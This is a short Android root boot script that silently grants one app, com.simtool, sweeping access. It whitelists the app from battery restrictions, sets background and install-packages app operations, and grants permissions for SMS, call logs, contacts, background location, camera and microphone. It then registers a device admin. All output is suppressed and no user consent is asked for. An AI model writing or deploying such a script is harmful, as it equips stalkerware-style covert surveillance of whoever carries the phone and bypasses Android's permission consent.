#!/system/bin/sh
MODDIR=${0%/*}
PKG="com.simtool"
ADMIN_COMP="com.simtool/.CompanyDeviceAdminReceiver"

# Wait up to 90s for Android boot completion
i=0
while [ "$(getprop sys.boot_completed 2>/dev/null)" != "1" ] && [ "$i" -lt 45 ]; do
  i=$((i + 1))
  sleep 2
done

# Wait up to 20s for PackageManager to register com.simtool
j=0
while ! pm path "$PKG" >/dev/null 2>&1 && [ "$j" -lt 10 ]; do
  j=$((j + 1))
  sleep 2
done

# Keep Doze/background execution unrestricted and ensure runtime/appops permissions
dumpsys deviceidle whitelist +"$PKG" >/dev/null 2>&1 || true

for op in \
  RUN_ANY_IN_BACKGROUND \
  RUN_IN_BACKGROUND \
  SYSTEM_ALERT_WINDOW \
  WRITE_SETTINGS \
  GET_USAGE_STATS \
  MANAGE_EXTERNAL_STORAGE \
  REQUEST_INSTALL_PACKAGES \
  START_FOREGROUND; do
  appops set "$PKG" "$op" allow >/dev/null 2>&1 || true
done

for perm in \
  android.permission.READ_PHONE_STATE \
  android.permission.READ_PHONE_NUMBERS \
  android.permission.ACCESS_FINE_LOCATION \
  android.permission.ACCESS_COARSE_LOCATION \
  android.permission.ACCESS_BACKGROUND_LOCATION \
  android.permission.READ_CONTACTS \
  android.permission.WRITE_CONTACTS \
  android.permission.READ_CALL_LOG \
  android.permission.WRITE_CALL_LOG \
  android.permission.CALL_PHONE \
  android.permission.ANSWER_PHONE_CALLS \
  android.permission.READ_SMS \
  android.permission.RECEIVE_SMS \
  android.permission.SEND_SMS \
  android.permission.CAMERA \
  android.permission.RECORD_AUDIO \
  android.permission.BLUETOOTH_CONNECT \
  android.permission.BLUETOOTH_SCAN \
  android.permission.POST_NOTIFICATIONS \
  android.permission.READ_EXTERNAL_STORAGE \
  android.permission.WRITE_EXTERNAL_STORAGE; do
  pm grant "$PKG" "$perm" >/dev/null 2>&1 || true
done

# Register as secondary active Device Admin alongside any existing Device Owner (never alters DO)
dpm set-active-admin "$ADMIN_COMP" >/dev/null 2>&1 || true
